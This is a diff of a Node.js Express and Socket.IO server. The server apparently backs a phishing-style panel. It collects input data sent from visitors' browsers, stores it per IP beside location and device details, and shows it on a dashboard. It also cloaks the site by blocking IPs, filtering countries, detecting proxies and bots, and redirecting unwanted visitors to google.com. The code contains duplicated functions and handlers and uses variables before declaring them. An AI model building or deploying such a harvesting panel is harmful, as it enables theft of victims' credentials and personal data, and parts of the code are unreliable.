@@ -1,108 +1,5 @@
 require('dotenv').config();
-const originalPath = require("path");
-
-// Create a safer version of the path module
-const path = Object.create(originalPath);
-
-// Helper function to safely check if a value is a string
-function isString(value) {
-  return typeof value === 'string' || value instanceof String;
-}
-
-// Helper function to safely check if a path starts with a prefix
-function safePathStartsWith(pathStr, prefix) {
-  if (!isString(pathStr)) {
-    console.log(`Warning: path is not a string: ${typeof pathStr}`, pathStr);
-    return false;
-  }
-  return pathStr.startsWith(prefix);
-}
-
-// Helper function to get a valid string path or default
-function getValidPath(pathStr, defaultPath = '/') {
-  return isString(pathStr) ? pathStr : defaultPath;
-}
-
-// Patch String.prototype.startsWith to be safe with non-strings
-const originalStartsWith = String.prototype.startsWith;
-String.prototype.startsWith = function(searchString, position) {
-  try {
-    return originalStartsWith.call(this, searchString, position);
-  } catch (error) {
-    console.error('Error in startsWith:', error);
-    return false;
-  }
-};
-
-// Patch global path object to make it safer
-const originalPathStartsWith = path.startsWith;
-path.startsWith = function(pathStr, prefix) {
-  return safePathStartsWith(pathStr, prefix);
-};
-
-// Add a safe version of path operations
-path.safeStartsWith = safePathStartsWith;
-path.getValidPath = getValidPath;
-path.isString = isString;
-
-// Safe parseUserAgent function to handle the error in the deployed code
-function safeParseUserAgent(userAgent, pathStr) {
-  try {
-    // This is a fallback implementation since we don't have the original function
-    // It will be used if the original parseUserAgent returns undefined
-    const defaultResult = {
-      browser: 'Unknown',
-      browserVersion: 'Unknown',
-      os: 'Unknown',
-      osVersion: 'Unknown',
-      device: 'Unknown',
-      isBot: false
-    };
-    
-    // If there's a parseUserAgent function defined elsewhere, this will be overridden
-    if (typeof parseUserAgent === 'function') {
-      const result = parseUserAgent(userAgent, pathStr);
-      // If result is undefined or missing browser property, return default
-      if (!result || typeof result.browser === 'undefined') {
-        console.log('Warning: parseUserAgent returned undefined or invalid result');
-        return defaultResult;
-      }
-      return result;
-    }
-    
-    return defaultResult;
-  } catch (error) {
-    console.error('Error in parseUserAgent:', error);
-    return {
-      browser: 'Unknown',
-      browserVersion: 'Unknown',
-      os: 'Unknown',
-      osVersion: 'Unknown',
-      device: 'Unknown',
-      isBot: false
-    };
-  }
-}
-
-// Override global parseUserAgent if it exists
-if (typeof parseUserAgent !== 'undefined') {
-  const originalParseUserAgent = parseUserAgent;
-  global.parseUserAgent = function(userAgent, pathStr) {
-    try {
-      const result = originalParseUserAgent(userAgent, pathStr);
-      if (!result || typeof result.browser === 'undefined') {
-        return safeParseUserAgent(userAgent, pathStr);
-      }
-      return result;
-    } catch (error) {
-      console.error('Error in original parseUserAgent:', error);
-      return safeParseUserAgent(userAgent, pathStr);
-    }
-  };
-} else {
-  global.parseUserAgent = safeParseUserAgent;
-}
-
+const path = require("path");
 const express = require("express");
 const requestIp = require("request-ip");
 var session = require('express-session');
@@ -117,92 +14,1113 @@ const app = express();
 const http = require('http').createServer(app);
 const io = new Server(http);
 
-const redirectURL = process.env.URL; // Replace with your desired redirect URL
+// Global settings object for configuration
+const globalSettings = {
+  blockedIPs: new Set(), // Using Set for O(1) lookup
+  proxyDetectionEnabled: true,
+  countryFilterMode: 'block', // 'block' or 'allow'
+  countryRedirectUrl: 'https://google.com',
+  blockedCountries: new Set(),
+  allowedCountries: new Set()
+};
+
+// Path for storing blocked IPs
+const BLOCKED_IPS_FILE = path.join(__dirname, 'blocked_ips.json');
+
+/**
+ * Check if an IP address is blocked
+ * @param {string} ip - The IP address to check
+ * @returns {boolean} - True if the IP is blocked, false otherwise
+ */
+function isIPBlocked(ip) {
+  // Skip blocking for local/private IPs
+  if (isLocalIP(ip)) {
+    return false;
+  }
+  return globalSettings.blockedIPs.has(ip);
+}
+
+/**
+ * Check if an IP address is local/private
+ * @param {string} ip - The IP address to check
+ * @returns {boolean} - True if the IP is local/private, false otherwise
+ */
+function isLocalIP(ip) {
+  return ip === '127.0.0.1' || 
+         ip === 'localhost' || 
+         ip === '::1' || 
+         ip.startsWith('10.') || 
+         ip.startsWith('192.168.') || 
+         (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31);
+}
+
+/**
+ * Block an IP address
+ * @param {string} ip - The IP address to block
+ * @returns {boolean} - True if the IP was blocked, false if it was already blocked
+ */
+function blockIP(ip) {
+  // Skip blocking for local/private IPs
+  if (isLocalIP(ip)) {
+    console.log(`Cannot block local/private IP: ${ip}`);
+    return false;
+  }
+  
+  // Check if already blocked
+  if (globalSettings.blockedIPs.has(ip)) {
+    console.log(`IP ${ip} is already blocked`);
+    return false;
+  }
+  
+  // Add to blocked IPs set
+  globalSettings.blockedIPs.add(ip);
+  console.log(`IP ${ip} has been blocked`);
+  
+  // Save to persistent storage
+  saveBlockedIPs();
+  
+  // Notify all dashboard clients
+  io.emit('ip-blocked', { ip, timestamp: Date.now() });
+  
+  return true;
+}
+
+/**
+ * Unblock an IP address
+ * @param {string} ip - The IP address to unblock
+ * @returns {boolean} - True if the IP was unblocked, false if it wasn't blocked
+ */
+function unblockIP(ip) {
+  // Check if not blocked
+  if (!globalSettings.blockedIPs.has(ip)) {
+    console.log(`IP ${ip} is not blocked`);
+    return false;
+  }
+  
+  // Remove from blocked IPs set
+  globalSettings.blockedIPs.delete(ip);
+  console.log(`IP ${ip} has been unblocked`);
+  
+  // Save to persistent storage
+  saveBlockedIPs();
+  
+  // Notify all dashboard clients
+  io.emit('ip-unblocked', { ip, timestamp: Date.now() });
+  
+  return true;
+}
+
+/**
+ * Save blocked IPs to persistent storage
+ */
+function saveBlockedIPs() {
+  try {
+    const blockedIPsArray = Array.from(globalSettings.blockedIPs);
+    fs.writeFileSync(BLOCKED_IPS_FILE, JSON.stringify(blockedIPsArray, null, 2));
+    console.log(`Saved ${blockedIPsArray.length} blocked IPs to ${BLOCKED_IPS_FILE}`);
+  } catch (error) {
+    console.error('Error saving blocked IPs:', error);
+  }
+}
+
+/**
+ * Load blocked IPs from persistent storage
+ */
+function loadBlockedIPs() {
+  try {
+    if (fs.existsSync(BLOCKED_IPS_FILE)) {
+      const blockedIPsArray = JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE, 'utf8'));
+      globalSettings.blockedIPs = new Set(blockedIPsArray);
+      console.log(`Loaded ${blockedIPsArray.length} blocked IPs from ${BLOCKED_IPS_FILE}`);
+    } else {
+      console.log(`No blocked IPs file found at ${BLOCKED_IPS_FILE}, starting with empty set`);
+      globalSettings.blockedIPs = new Set();
+    }
+  } catch (error) {
+    console.error('Error loading blocked IPs:', error);
+    globalSettings.blockedIPs = new Set();
+  }
+}
+
+// Load blocked IPs on startup
+loadBlockedIPs();
+
+/**
+ * Convert country name to ISO country code (2-letter code)
+ * @param {string} countryName - The name of the country
+ * @returns {string} - The 2-letter ISO country code or null if not found
+ */
+function getCountryCode(countryName) {
+  if (!countryName || countryName === 'Unknown') return null;
+  
+  // Map of common country names to their ISO codes
+  const countryMap = {
+    'afghanistan': 'af',
+    'albania': 'al',
+    'algeria': 'dz',
+    'andorra': 'ad',
+    'angola': 'ao',
+    'argentina': 'ar',
+    'armenia': 'am',
+    'australia': 'au',
+    'austria': 'at',
+    'azerbaijan': 'az',
+    'bahamas': 'bs',
+    'bahrain': 'bh',
+    'bangladesh': 'bd',
+    'barbados': 'bb',
+    'belarus': 'by',
+    'belgium': 'be',
+    'belize': 'bz',
+    'benin': 'bj',
+    'bhutan': 'bt',
+    'bolivia': 'bo',
+    'bosnia': 'ba',
+    'bosnia and herzegovina': 'ba',
+    'botswana': 'bw',
+    'brazil': 'br',
+    'brunei': 'bn',
+    'bulgaria': 'bg',
+    'burkina faso': 'bf',
+    'burundi': 'bi',
+    'cambodia': 'kh',
+    'cameroon': 'cm',
+    'canada': 'ca',
+    'cape verde': 'cv',
+    'central african republic': 'cf',
+    'chad': 'td',
+    'chile': 'cl',
+    'china': 'cn',
+    'colombia': 'co',
+    'comoros': 'km',
+    'congo': 'cg',
+    'costa rica': 'cr',
+    'croatia': 'hr',
+    'cuba': 'cu',
+    'cyprus': 'cy',
+    'czech republic': 'cz',
+    'denmark': 'dk',
+    'djibouti': 'dj',
+    'dominica': 'dm',
+    'dominican republic': 'do',
+    'east timor': 'tl',
+    'ecuador': 'ec',
+    'egypt': 'eg',
+    'el salvador': 'sv',
+    'equatorial guinea': 'gq',
+    'eritrea': 'er',
+    'estonia': 'ee',
+    'ethiopia': 'et',
+    'fiji': 'fj',
+    'finland': 'fi',
+    'france': 'fr',
+    'gabon': 'ga',
+    'gambia': 'gm',
+    'georgia': 'ge',
+    'germany': 'de',
+    'ghana': 'gh',
+    'greece': 'gr',
+    'grenada': 'gd',
+    'guatemala': 'gt',
+    'guinea': 'gn',
+    'guinea-bissau': 'gw',
+    'guyana': 'gy',
+    'haiti': 'ht',
+    'honduras': 'hn',
+    'hungary': 'hu',
+    'iceland': 'is',
+    'india': 'in',
+    'indonesia': 'id',
+    'iran': 'ir',
+    'iraq': 'iq',
+    'ireland': 'ie',
+    'israel': 'il',
+    'italy': 'it',
+    'ivory coast': 'ci',
+    'jamaica': 'jm',
+    'japan': 'jp',
+    'jordan': 'jo',
+    'kazakhstan': 'kz',
+    'kenya': 'ke',
+    'kiribati': 'ki',
+    'korea, north': 'kp',
+    'korea, south': 'kr',
+    'north korea': 'kp',
+    'south korea': 'kr',
+    'kosovo': 'xk',
+    'kuwait': 'kw',
+    'kyrgyzstan': 'kg',
+    'laos': 'la',
+    'latvia': 'lv',
+    'lebanon': 'lb',
+    'lesotho': 'ls',
+    'liberia': 'lr',
+    'libya': 'ly',
+    'liechtenstein': 'li',
+    'lithuania': 'lt',
+    'luxembourg': 'lu',
+    'macedonia': 'mk',
+    'madagascar': 'mg',
+    'malawi': 'mw',
+    'malaysia': 'my',
+    'maldives': 'mv',
+    'mali': 'ml',
+    'malta': 'mt',
+    'marshall islands': 'mh',
+    'mauritania': 'mr',
+    'mauritius': 'mu',
+    'mexico': 'mx',
+    'micronesia': 'fm',
+    'moldova': 'md',
+    'monaco': 'mc',
+    'mongolia': 'mn',
+    'montenegro': 'me',
+    'morocco': 'ma',
+    'mozambique': 'mz',
+    'myanmar': 'mm',
+    'namibia': 'na',
+    'nauru': 'nr',
+    'nepal': 'np',
+    'netherlands': 'nl',
+    'new zealand': 'nz',
+    'nicaragua': 'ni',
+    'niger': 'ne',
+    'nigeria': 'ng',
+    'norway': 'no',
+    'oman': 'om',
+    'pakistan': 'pk',
+    'palau': 'pw',
+    'palestine': 'ps',
+    'panama': 'pa',
+    'papua new guinea': 'pg',
+    'paraguay': 'py',
+    'peru': 'pe',
+    'philippines': 'ph',
+    'poland': 'pl',
+    'portugal': 'pt',
+    'qatar': 'qa',
+    'romania': 'ro',
+    'russia': 'ru',
+    'rwanda': 'rw',
+    'saint kitts and nevis': 'kn',
+    'saint lucia': 'lc',
+    'saint vincent': 'vc',
+    'samoa': 'ws',
+    'san marino': 'sm',
+    'sao tome and principe': 'st',
+    'saudi arabia': 'sa',
+    'senegal': 'sn',
+    'serbia': 'rs',
+    'seychelles': 'sc',
+    'sierra leone': 'sl',
+    'singapore': 'sg',
+    'slovakia': 'sk',
+    'slovenia': 'si',
+    'solomon islands': 'sb',
+    'somalia': 'so',
+    'south africa': 'za',
+    'south sudan': 'ss',
+    'spain': 'es',
+    'sri lanka': 'lk',
+    'sudan': 'sd',
+    'suriname': 'sr',
+    'swaziland': 'sz',
+    'sweden': 'se',
+    'switzerland': 'ch',
+    'syria': 'sy',
+    'taiwan': 'tw',
+    'tajikistan': 'tj',
+    'tanzania': 'tz',
+    'thailand': 'th',
+    'togo': 'tg',
+    'tonga': 'to',
+    'trinidad and tobago': 'tt',
+    'tunisia': 'tn',
+    'turkey': 'tr',
+    'turkmenistan': 'tm',
+    'tuvalu': 'tv',
+    'uganda': 'ug',
+    'ukraine': 'ua',
+    'united arab emirates': 'ae',
+    'uae': 'ae',
+    'united kingdom': 'gb',
+    'uk': 'gb',
+    'united states': 'us',
+    'usa': 'us',
+    'united states of america': 'us',
+    'uruguay': 'uy',
+    'uzbekistan': 'uz',
+    'vanuatu': 'vu',
+    'vatican city': 'va',
+    'venezuela': 've',
+    'vietnam': 'vn',
+    'yemen': 'ye',
+    'zambia': 'zm',
+    'zimbabwe': 'zw'
+  };
+  
+  // Try to find the country code
+  const normalizedCountry = countryName.trim().toLowerCase();
+  return countryMap[normalizedCountry] || null;
+}
+
+// Track online visitors count
+let onlineVisitors = 0;
+
+// Socket.IO connection handler
+io.on('connection', (socket) => {
+  console.log('New client connected:', socket.id);
+  
+  // Store client IP
+  let clientIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+  
+  // If the client IP is localhost or ::1, use a test IP for development
+  if (clientIP === '127.0.0.1' || clientIP === '::1' || clientIP === 'localhost') {
+    // Check if we have a real IP from the client
+    if (socket.handshake.query && socket.handshake.query.ip) {
+      clientIP = socket.handshake.query.ip;
+      console.log(`Using client-provided IP: ${clientIP}`);
+    } else {
+      // For testing, use a sample IP
+      clientIP = '102.97.189.155';
+      console.log(`Using test IP for localhost: ${clientIP}`);
+    }
+  }
+  
+  // Store the client IP in the socket object for easy access
+  socket.clientIP = clientIP;
+  
+  // Check if this IP is blocked
+  if (isIPBlocked(clientIP)) {
+    console.log(`Blocked IP ${clientIP} attempted to connect - redirecting and disconnecting`);
+    
+    // Get the redirect URL (use default if not specified)
+    const redirectUrl = globalSettings.countryRedirectUrl || 'https://google.com';
+    
+    // Send redirect event to the client
+    socket.emit('redirect', { url: redirectUrl, reason: 'ip_blocked' });
+    
+    // Disconnect after a short delay to ensure the redirect event is sent
+    setTimeout(() => {
+      if (socket.connected) {
+        socket.disconnect(true);
+      }
+    }, 500);
+    
+    return; // Stop further processing for this socket
+  }
+  
+  // Update online visitors count for non-blocked IPs
+  onlineVisitors++;
+  io.emit('online-visitors-count', { count: onlineVisitors });
+  
+  // Emit proxy detection status to the new client
+  socket.emit('proxy-detection-status', { enabled: globalSettings.proxyDetectionEnabled || false });
+  
+  // Disconnect handler
+  socket.on('disconnect', () => {
+    console.log('Client disconnected:', socket.id);
+    
+    // Check if this socket has an accurate client IP mapping
+    let clientIP = null;
+    let apparentIP = null;
+    
+    // Find the mapping for this socket
+    for (const [appIP, mapping] of accurateClientIPs.entries()) {
+      if (mapping.socketId === socket.id) {
+        clientIP = mapping.clientIP;
+        apparentIP = appIP;
+        break;
+      }
+    }
+    
+    // If we found a mapped IP, use that for disconnection
+    if (clientIP) {
+      console.log(`Client disconnected with mapped IP: ${clientIP}`);
+      trackIPStatus(clientIP, false, socket.id);
+      
+      // Also clean up the mapping
+      if (apparentIP) {
+        accurateClientIPs.delete(apparentIP);
+      }
+    }
+    
+    // Decrement online visitors count
+    onlineVisitors = Math.max(0, onlineVisitors - 1);
+    io.emit('online-visitors-count', { count: onlineVisitors });
+    
+    // Remove this socket from the activeSocketsByIP map
+    if (socket.clientIP && activeSocketsByIP.has(socket.clientIP)) {
+      const activeSockets = activeSocketsByIP.get(socket.clientIP);
+      activeSockets.delete(socket.id);
+      
+      // If no more active sockets for this IP, remove the entry
+      if (activeSockets.size === 0) {
+        activeSocketsByIP.delete(socket.clientIP);
+      }
+    }
+  });
+  
+  // Create or update visitor metadata
+  const userAgent = socket.handshake.headers['user-agent'] || '';
+  const parser = new UAParser(userAgent);
+  const browser = parser.getBrowser();
+  const os = parser.getOS();
+  const device = parser.getDevice();
+  
+  // Initial visitor metadata
+  const initialMetadata = {
+    ip: clientIP,
+    browser: browser.name ? `${browser.name} ${browser.version}` : 'Unknown',
+    os: os.name ? `${os.name} ${os.version}` : 'Unknown',
+    device: device.vendor ? `${device.vendor} ${device.model}` : (device.type || 'Desktop'),
+    lastActivity: new Date().toISOString(),
+    isOnline: true,
+    currentPath: socket.handshake.query.path || '/',
+    referrer: socket.handshake.query.referrer || 'Direct',
+    country: socket.handshake.query.country || 'Unknown',
+    countryCode: socket.handshake.query.countryCode || getCountryCode(socket.handshake.query.country),
+    city: socket.handshake.query.city || 'Unknown'
+  };
+  
+  // Update visitor metadata
+  updateVisitorMetadata(clientIP, initialMetadata);
+  
+  // Handle input data events
+  socket.on('input-data', (data) => {
+    // Update input data cache
+    updateInputDataCache(clientIP, data);
+  });
+  
+  // Handle visitor metadata updates
+  socket.on('visitor-metadata', (data) => {
+    // Update visitor metadata
+    updateVisitorMetadata(clientIP, data);
+  });
+  
+  // Handle page navigation
+  socket.on('page-view', (data) => {
+    // Update visitor's current path
+    updateVisitorMetadata(clientIP, {
+      currentPath: data.path || '/',
+      lastActivity: new Date().toISOString()
+    });
+  });
+  
+  // Handle disconnect
+  socket.on('disconnect', () => {
+    console.log('Client disconnected:', socket.id);
+    
+    // Mark visitor as offline after a delay (to handle page refreshes)
+    setTimeout(() => {
+      const metadata = visitorMetadata.get(clientIP);
+      if (metadata) {
+        updateVisitorMetadata(clientIP, { isOnline: false });
+      }
+    }, 5000);
+  });
+});
+
+// Function to update input data cache
+function updateInputDataCache(clientIP, data) {
+  // Add timestamp if not provided
+  if (!data.timestamp) {
+    data.timestamp = new Date().toISOString();
+  }
+  
+  // Get existing inputs or create new array
+  let inputs = inputDataByIP.get(clientIP) || [];
+  
+  // Add new input at the beginning (newest first)
+  inputs.unshift(data);
+  
+  // Limit to 50 most recent inputs
+  if (inputs.length > 50) {
+    inputs = inputs.slice(0, 50);
+  }
+  
+  // Update cache
+  inputDataByIP.set(clientIP, inputs);
+  
+  // Notify dashboard of new input data
+  io.emit('input-data-update');
+}
+
+// Function to update visitor metadata
+function updateVisitorMetadata(clientIP, data) {
+  // Get existing metadata or create new object
+  const metadata = visitorMetadata.get(clientIP) || {
+    ip: clientIP,
+    firstSeen: new Date().toISOString(),
+    lastActivity: new Date().toISOString()
+  };
+  
+  // Update metadata with new data
+  Object.assign(metadata, data, {
+    lastActivity: new Date().toISOString() // Always update last activity
+  });
+  
+  // Update cache
+  visitorMetadata.set(clientIP, metadata);
+  
+  // Emit dashboard update event
+  io.emit('dashboard-update');
+}
+
+// Add express.json middleware to parse JSON request bodies
+app.use(express.json());
+
+// Update existing global settings with additional configuration
+globalSettings.countryFilterMode = globalSettings.countryFilterMode || 'block'; // 'block' or 'allow'
+globalSettings.blockedCountries = globalSettings.blockedCountries || new Set();
+globalSettings.allowedCountries = globalSettings.allowedCountries || new Set();
+globalSettings.countryRedirectUrl = globalSettings.countryRedirectUrl || 'https://google.com';
+globalSettings.proxyDetectionEnabled = globalSettings.proxyDetectionEnabled !== undefined ? globalSettings.proxyDetectionEnabled : false;
+// These are already defined in the first globalSettings declaration
+// globalSettings.blockedIPs = globalSettings.blockedIPs || new Set(); // Store blocked IPs in a Set for efficient lookup
+globalSettings.ipRedirectUrls = new Map(); // Key: IP, Value: { redirectUrl, reason }
+
+// The isIPBlocked function is already defined above with more comprehensive logic
+// This comment is kept to maintain code structure
+
+/**
+ * Block an IP address
+ * @param {string} ip - The IP address to block
+ * @param {string} [redirectUrl] - Optional custom redirect URL for this IP
+ * @returns {boolean} - True if the IP was blocked, false if it was already blocked
+ */
+// The blockIP and unblockIP functions are already defined above with more comprehensive logic
+// This comment is kept to maintain code structure
+
+/**
+ * Save blocked IPs to a file for persistence
+ */
+function saveBlockedIPs() {
+  try {
+    const blockedIPsArray = Array.from(globalSettings.blockedIPs);
+    fs.writeFileSync('blocked_ips.json', JSON.stringify(blockedIPsArray, null, 2));
+    console.log('Blocked IPs saved to file');
+  } catch (error) {
+    console.error('Error saving blocked IPs:', error);
+  }
+}
+
+/**
+ * Load blocked IPs from file
+ */
+function loadBlockedIPs() {
+  try {
+    if (fs.existsSync('blocked_ips.json')) {
+      const data = fs.readFileSync('blocked_ips.json', 'utf8');
+      const blockedIPsArray = JSON.parse(data);
+      globalSettings.blockedIPs = new Set(blockedIPsArray);
+      console.log(`Loaded ${globalSettings.blockedIPs.size} blocked IPs from file`);
+    }
+  } catch (error) {
+    console.error('Error loading blocked IPs:', error);
+    globalSettings.blockedIPs = new Set();
+  }
+}
+
+// Load blocked IPs on startup
+loadBlockedIPs();
+
+// We'll use the Maps declared below for tracking client IPs and their status
+
+// Map to store input data for each IP
+const inputDataByIP = new Map(); // Key: IP, Value: Array of input data objects
+
+// Map to store visitor metadata
+const visitorMetadata = new Map(); // Key: IP, Value: visitor metadata object
+
+// Add some sample visitors for testing
+function addSampleVisitors() {
+  // Sample visitor 1
+  visitorMetadata.set('102.97.189.155', {
+    ip: '102.97.189.155',
+    browser: 'Chrome 114.0.5735',
+    os: 'Windows 10',
+    device: 'Desktop',
+    firstSeen: new Date(Date.now() - 3600000).toISOString(), // 1 hour ago
+    lastActivity: new Date().toISOString(),
+    isOnline: true,
+    currentPath: '/QcEwP85AgNE4pnL5mWSM',
+    referrer: 'Direct',
+    country: 'Morocco',
+    countryCode: 'ma',
+    city: 'Casablanca',
+    org: 'ISP Morocco',
+    isp: 'Maroc Telecom',
+    proxy: false
+  });
+  
+  // Sample visitor 2
+  visitorMetadata.set('45.123.45.67', {
+    ip: '45.123.45.67',
+    browser: 'Firefox 98.0',
+    os: 'macOS 12.3',
+    device: 'Desktop',
+    firstSeen: new Date(Date.now() - 7200000).toISOString(), // 2 hours ago
+    lastActivity: new Date(Date.now() - 1800000).toISOString(), // 30 minutes ago
+    isOnline: false,
+    currentPath: '/login',
+    referrer: 'google.com',
+    country: 'United States',
+    countryCode: 'us',
+    city: 'New York',
+    org: 'Verizon',
+    isp: 'Verizon Communications',
+    proxy: false
+  });
+}
+
+// Add sample visitors when server starts
+addSampleVisitors();
+
+// GET endpoint to retrieve input data for a specific IP
+app.get('/dashboard/input-data/:ip', (req, res) => {
+  try {
+    const { ip } = req.params;
+    
+    // Get visitor metadata
+    const visitorData = visitorMetadata.get(ip) || {
+      ip: ip,
+      firstSeen: new Date().toISOString(),
+      lastActivity: new Date().toISOString(),
+      browser: 'Unknown',
+      os: 'Unknown',
+      device: 'Unknown',
+      country: 'Unknown',
+      city: 'Unknown',
+      org: 'Unknown',
+      isp: 'Unknown',
+      proxy: false,
+      currentPath: '/',
+      referrer: 'Direct'
+    };
+    
+    // Get input data for this IP
+    const inputs = inputDataByIP.get(ip) || [];
+    
+    // Return both metadata and inputs
+    res.json({
+      success: true,
+      meta: visitorData,
+      inputs: inputs
+    });
+  } catch (error) {
+    console.error('Error retrieving input data:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Error retrieving input data',
+      error: error.message
+    });
+  }
+});
+
+// GET endpoint to retrieve all visitor data for the dashboard
+app.get('/dashboard/visitors', (req, res) => {
+  try {
+    // Convert visitor metadata map to array
+    const visitors = Array.from(visitorMetadata.entries()).map(([ip, data]) => {
+      // Check if visitor has input data
+      const hasInputData = inputDataByIP.has(ip) && inputDataByIP.get(ip).length > 0;
+      
+      // Get IP cache data for request count
+      const ipCacheData = ipCache.get(ip) || {};
+      
+      return {
+        ...data,
+        ip: ip,
+        hasInputData: hasInputData,
+        inputCount: hasInputData ? inputDataByIP.get(ip).length : 0,
+        requestCount: ipCacheData.requestCount || 0,
+        isOnline: (new Date() - new Date(data.lastActivity)) < 5 * 60 * 1000 // Online if active in last 5 minutes
+      };
+    });
+    
+    // Return visitor data and stats
+    res.json({
+      success: true,
+      visitors: visitors,
+      stats: {
+        totalVisitors: visitors.length,
+        botsDetected: visitors.filter(v => v.isBot).length,
+        proxyCount: visitors.filter(v => v.proxy).length,
+        blockedCount: visitors.filter(v => v.blocked).length
+      }
+    });
+  } catch (error) {
+    console.error('Error retrieving visitor data:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Error retrieving visitor data',
+      error: error.message
+    });
+  }
+});
+
+// DELETE endpoint to clear input data cache for a specific IP
+app.delete('/dashboard/input-data/:ip', (req, res) => {
+  const { ip } = req.params;
+  
+  // Check if there's data to delete
+  if (!inputDataByIP.has(ip)) {
+    return res.json({
+      success: false,
+      message: 'No input data found for this IP'
+    });
+  }
+  
+  // Delete input data for this IP
+  inputDataByIP.delete(ip);
+  
+  // Notify dashboard clients about the update
+  io.emit('input-data-update');
+  
+  res.json({
+    success: true,
+    message: `Input data cache cleared for IP ${ip}`
+  });
+});
+
+const redirectURL = process.env.URL || 'https://google.com'; // Default redirect URL if not specified in .env
+
+// Middleware to check for IP-specific redirects
+app.use((req, res, next) => {
+  // Skip for dashboard and API routes
+  if (req.path.startsWith('/dashboard') || req.path.startsWith('/api') || req.path === '/socket.io/') {
+    return next();
+  }
+  
+  const clientIp = getAccurateClientIp(req);
+  
+  // Check if this IP has a redirect setting
+  if (globalSettings.ipRedirectUrls.has(clientIp)) {
+    const redirectSetting = globalSettings.ipRedirectUrls.get(clientIp);
+    const statusCode = redirectSetting.isPermanent ? 301 : 302;
+    
+    console.log(`Redirecting IP ${clientIp} to ${redirectSetting.redirectUrl} (${statusCode})`);
+    
+    // Perform the redirect
+    return res.redirect(statusCode, redirectSetting.redirectUrl);
+  }
+  
+  next();
+});
+
+/**
+ * Track IP status (online/offline) and associated socket IDs
+ * @param {string} ip - The client IP address
+ * @param {boolean} online - Whether the client is online
+ * @param {string} socketId - The socket.io ID for this connection
+ */
+function trackIPStatus(ip, online, socketId) {
+  if (!ip) return;
+  
+  // Get existing data or create new entry
+  const ipData = ipCache.get(ip) || {
+    online: false,
+    connections: new Set(),
+    lastSeen: new Date()
+  };
+  
+  // Update status
+  ipData.online = online;
+  ipData.lastSeen = new Date();
+  
+  // Ensure connections is a Set
+  if (!ipData.connections || typeof ipData.connections.add !== 'function') {
+    ipData.connections = new Set();
+  }
+  
+  // Add or remove socket ID from connections
+  if (online && socketId) {
+    ipData.connections.add(socketId);
+  } else if (socketId && ipData.connections.has && ipData.connections.has(socketId)) {
+    ipData.connections.delete(socketId);
+    // If no more connections, mark as offline
+    if (ipData.connections.size === 0) {
+      ipData.online = false;
+    }
+  }
+  
+  // Update the cache
+  ipCache.set(ip, ipData);
+  
+  // Log status change
+  console.log(`IP ${ip} status updated: online=${ipData.online}, active connections=${ipData.connections.size}`);
+}
 
 // Socket.io connection handling
 io.on('connection', (socket) => {
-  console.log('New client connected:', socket.id);
+  // Helper function to validate if an IP is a public IP (not local/private)
+  function isValidPublicIP(ip) {
+    if (!ip) return false;
+    
+    // Check if it's a valid IP format
+    const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
+    if (!ipRegex.test(ip)) return false;
+    
+    // Check if it's not a local/private IP
+    const parts = ip.split('.');
+    const firstOctet = parseInt(parts[0], 10);
+    const secondOctet = parseInt(parts[1], 10);
+    
+    // Filter out local IPs
+    if (ip === '127.0.0.1') return false;
+    if (firstOctet === 10) return false; // 10.0.0.0/8
+    if (firstOctet === 172 && secondOctet >= 16 && secondOctet <= 31) return false; // 172.16.0.0/12
+    if (firstOctet === 192 && secondOctet === 168) return false; // 192.168.0.0/16
+    if (firstOctet === 169 && secondOctet === 254) return false; // 169.254.0.0/16 (APIPA)
+    if (ip === '0.0.0.0') return false;
+    if (ip.startsWith('::1') || ip.startsWith('fe80:') || ip.startsWith('fc00:')) return false; // IPv6 local
+    
+    return true;
+  }
+  
+  // Get the socket's apparent IP address
+  const socketIP = socket.handshake.address || 
+                  socket.handshake.headers['x-forwarded-for'] || 
+                  socket.conn.remoteAddress;
+  
+  console.log('New client connected:', socket.id, 'Apparent IP:', socketIP);
+  
+  // Check if the client provided an IP in the connection query with source information
+  if (socket.handshake.query && socket.handshake.query.clientIP && 
+      isValidPublicIP(socket.handshake.query.clientIP)) {
+    const clientIP = socket.handshake.query.clientIP;
+    const source = socket.handshake.query.clientIPSource || 'socket-query';
+    const isFromIpify = source.includes('ipify');
+    
+    console.log(`Client provided IP in connection query (source: ${source}): ${clientIP}`);
+    
+    // Store mapping between socket IP and accurate client IP
+    accurateClientIPs.set(socketIP, {
+      clientIP: clientIP,
+      timestamp: new Date().toISOString(),
+      source: isFromIpify ? 'ipify.org' : source,
+      socketId: socket.id
+    });
+    
+    // Update user connection status with accurate IP
+    console.log(`User connected: IP=${clientIP}, SocketID=${socket.id}, Source=${isFromIpify ? 'ipify.org' : source}`);
+    // Track this IP as online
+    trackIPStatus(clientIP, true, socket.id);
+  } else {
+    // Use apparent IP temporarily until we get a more accurate one
+    console.log(`User connected with apparent IP: IP=${socketIP}, SocketID=${socket.id}`);
+    // We don't track the apparent IP to avoid duplicate counting
+    // We'll wait for the client to send its accurate IP via client-ip event
+  }
+
+  // Handle client IP events from tracker.js
+  socket.on('client-ip', (data) => {
+    if (data && data.clientIP && isValidPublicIP(data.clientIP)) {
+      const source = data.source || 'socket.io';
+      const isFromIpify = source.includes('ipify');
+      
+      // Prioritize ipify.org source
+      if (isFromIpify) {
+        console.log(`✅ Received accurate client IP from ipify.org: ${data.clientIP}`);
+      } else {
+        console.log(`Received client IP from ${source}: ${data.clientIP}`);
+      }
+      
+      // Check if we already have a connection tracked for the apparent IP
+      if (ipCache.has(socketIP)) {
+        // Remove the tracking for the apparent IP to avoid duplicate counting
+        const apparentIPData = ipCache.get(socketIP);
+        if (apparentIPData && apparentIPData.connections && apparentIPData.connections.has) {
+          if (apparentIPData.connections.has(socket.id)) {
+            console.log(`Removing tracking for apparent IP ${socketIP} to avoid duplicate counting`);
+            trackIPStatus(socketIP, false, socket.id);
+          }
+        }
+      }
+      
+      // Store mapping between socket IP and accurate client IP
+      accurateClientIPs.set(socketIP, {
+        clientIP: data.clientIP,
+        timestamp: new Date().toISOString(),
+        source: isFromIpify ? 'ipify.org' : source,
+        socketId: socket.id
+      });
+      
+      // Also update any existing visitor data
+      if (ipCache.has(socketIP)) {
+        const visitorData = ipCache.get(socketIP);
+        visitorData.accurateIP = data.clientIP;
+        visitorData.ipSource = isFromIpify ? 'ipify.org' : source;
+        ipCache.set(socketIP, visitorData);
